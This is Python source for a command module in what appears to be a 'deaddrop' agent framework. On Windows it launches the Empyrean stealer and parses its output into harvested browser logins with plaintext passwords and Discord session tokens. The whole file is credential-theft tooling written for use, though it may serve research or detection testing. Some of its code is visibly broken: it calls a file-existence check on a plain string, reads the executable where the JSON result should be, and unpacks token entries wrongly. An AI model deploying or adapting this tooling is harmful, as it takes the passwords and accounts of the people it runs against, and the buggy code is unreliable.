"""
Runs Empyrean.

This is the subprocess version, which is intentionally less well-structured.
"""

from typing import Any, Optional, Type
from pathlib import Path
import json
import logging
import subprocess
import sys
import traceback

from pydantic import BaseModel, Field, computed_field

from deaddrop_meta.command_lib import CommandBase, RendererBase
from deaddrop_meta.protocol_lib import Credential

logger = logging.getLogger(__name__)

# A list of all paths where the Empyrean executable may be found.
FALLBACK_PATHS = [
    Path("./contribs/empyrean/main.exe"),
    Path("./contribs/empyrean/empyrean.exe"),
    Path("empyrean.exe"),
]
OUTPUT_FILE = "./empyrean-result.json"


class EmpyreanExecArguments(BaseModel):
    """
    Simple helper class used for holding arguments.
    """

    empyrean_path: Path = Field(
        default=Path("./contribs/empyrean/main.exe"),
        json_schema_extra={"description": "The path to the Empyrean executable."},
    )


class EmpyreanExecResult(BaseModel):
    """
    Model representing the results of the shell command.
    """

    success: bool = Field(
        json_schema_extra={
            "description": (
                "Whether or not Empyrean ran. False if not on Windows, or if the"
                " executable was murdered before it could be run."
            )
        },
    )
    stdout: Optional[str] = Field(
        default=None,
        json_schema_extra={"description": "The stdout of the process."},
    )
    stderr: Optional[str] = Field(
        default=None,
        json_schema_extra={"description": "The stderr of the process."},
    )
    error: Optional[str] = Field(
        default=None,
        json_schema_extra={"description": "An error description."},
    )
    output: dict[str, Any] = Field(
        json_schema_extra={
            "description": "The complete, parsed output of running Empyrean."
        },
    )

    @computed_field
    @property
    def _credentials(self) -> list[Credential]:
        """
        Generate the standardized file output list.
        """
        if not self.output:
            return []
    
        result: list[Credential] = []
        # Pull out any browser data, if it exists
        if 'browsers' in self.output:
            for _browser_name, browser_dict in self.output['browsers'].items():
                for _profile_name, profile_dict in browser_dict.items():
                    for login in profile_dict['logins']:
                        cred = Credential(
                            credential_type="browser_login",
                            value=f"{login['url']}:{login['username']}:{login['password']}"
                        )
                        result.append(cred)

        # Now pull extracted discord session tokens
        if 'token' in self.output:
            for token, token_dict in self.output['token']:
                cred = Credential(
                    credential_type="discord_token",
                    value=f"{token_dict['username']}:{token}"
                )
                result.append(cred)

        return result


class EmpyreanExecCommand(CommandBase):
    """
    Execute Empyrean as a standalone PyInstaller binary. Windows-only.
    """

    name: str = "empyrean_exec"
    description: str = __doc__
    version: str = "0.0.1"
    argument_model: Type[BaseModel] = EmpyreanExecArguments
    result_model: Type[BaseModel] = EmpyreanExecResult

    command_renderer: Optional[Type[RendererBase]] = None

    @classmethod
    def execute_command(cls, args: dict[str, Any]) -> dict[str, Any]:
        cmd_args: EmpyreanExecArguments = EmpyreanExecArguments.model_validate(args)

        if sys.platform != "win32":
            return cls.return_invalid_os()
        else:
            # Add the selected path to the list of fallbacks.
            search_paths: list[Path] = [cmd_args.empyrean_path] + FALLBACK_PATHS
            for path in search_paths:
                if not path.exists():
                    logger.info(f"{path} does not exist")
                    continue

                p = subprocess.run([path.resolve()], capture_output=True)

                if not OUTPUT_FILE.exists():
                    return cls.return_missing_output(p.stdout, p.stderr)

                return cls.return_parsed_result(p.stdout, p.stderr, path)

            return cls.return_missing_exe()

    @staticmethod
    def return_missing_output(stdout: bytes, stderr: bytes) -> dict[str, Any]:
        """
        When the output file cannot be found, complain.
        """
        result = EmpyreanExecResult(
            success=False,
            error="empyrean-result.json missing.",
            stdout=stdout.decode(),
            stderr=stderr.decode(),
            output={},
        )

        return result.model_dump()

    @staticmethod
    def return_missing_exe() -> dict[str, Any]:
        """
        When the executable cannot be found, complain.
        """
        result = EmpyreanExecResult(
            success=False, error="Could not find the Empyrean executable.", output={}
        )

        return result.model_dump()

    @staticmethod
    def return_invalid_os() -> dict[str, Any]:
        """
        When this is run on a non-Windows environment, this does nothing.
        """
        result = EmpyreanExecResult(
            success=False,
            error="Pygin is running on a non-Windows environment.",
            output={},
        )

        return result.model_dump()

    @staticmethod
    def return_parsed_result(
        stdout: bytes, stderr: bytes, output_path: Path
    ) -> dict[str, Any]:
        """
        Nominal case.
        """
        try:
            with open(output_path, "rt") as fp:
                data = json.load(fp)

            result = EmpyreanExecResult(
                success=True,
                stdout=stdout.decode(),
                stderr=stderr.decode(),
                output=data,
            )

            return result.model_dump()
        except Exception:
            result = EmpyreanExecResult(
                success=False,
                stdout=stdout.decode(),
                stderr=stderr.decode(),
                error=traceback.format_exc(),
                output={},
            )

            return result.model_dump()
